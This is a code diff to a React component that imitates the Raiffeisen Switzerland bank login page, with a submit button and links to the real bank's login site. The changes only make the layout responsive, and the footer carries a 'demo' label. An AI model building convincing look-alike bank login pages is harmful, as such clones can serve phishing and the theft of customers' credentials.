@@ -149,25 +149,25 @@ const ChRaiffeisen = () => {
             {/* Weiter Button */}
             <button
               onClick={handleSubmit}
-              className="bg-[#1a1a1a] text-white font-medium px-14 py-3 rounded-sm hover:bg-[#333] transition-colors mb-8"
+              className="w-full md:w-auto bg-[#1a1a1a] text-white font-medium px-14 py-3 rounded-sm hover:bg-[#333] transition-colors mb-8"
             >
               {t.submit}
             </button>
 
             {/* Passwort vergessen */}
-            <div>
+            <div className="text-center md:text-left">
               <a href="https://login.raiffeisen.ch/de/first-factor" className="text-base underline underline-offset-[6px] decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
                 {t.forgot}
               </a>
             </div>
           </div>
 
-          {/* Bottom service links - links unter Passwort vergessen ausgerichtet */}
-          <div className="mt-auto pt-10 pb-8 w-full flex items-center justify-between md:pl-[22%] pr-12 text-base">
-            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
+          {/* Bottom service links */}
+          <div className="mt-auto pt-10 pb-8 w-full flex flex-col md:flex-row items-stretch md:items-center md:justify-between md:pl-[22%] pr-12 text-base">
+            <a href="https://login.raiffeisen.ch/de/first-factor" className="self-start underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
               {t.phototan}
             </a>
-            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
+            <a href="https://login.raiffeisen.ch/de/first-factor" className="self-end mt-4 md:mt-0 underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
               {t.help}
             </a>
           </div>
@@ -178,7 +178,7 @@ const ChRaiffeisen = () => {
 
         {/* Footer */}
         <footer className="bg-[#f2f2f2] relative">
-          <div className="flex items-center justify-between pt-10 pb-2 px-[90px] text-sm">
+          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6 md:gap-0 pt-10 pb-2 px-6 md:px-[90px] text-sm">
             <span className="font-bold text-black">{t.demo}</span>
             <div className="flex items-center gap-8">
               {(["de", "fr", "it"] as const).map((l) => (
@@ -192,7 +192,7 @@ const ChRaiffeisen = () => {
               ))}
             </div>
           </div>
-          <div className="px-[90px] pb-10 pt-8 text-sm text-black">{t.copyright}</div>
+          <div className="px-6 md:px-[90px] pb-10 pt-6 md:pt-8 text-sm text-black">{t.copyright}</div>
         </footer>
 
         {/* Roter Balken (50% links) + grauer Streifen rechts */}
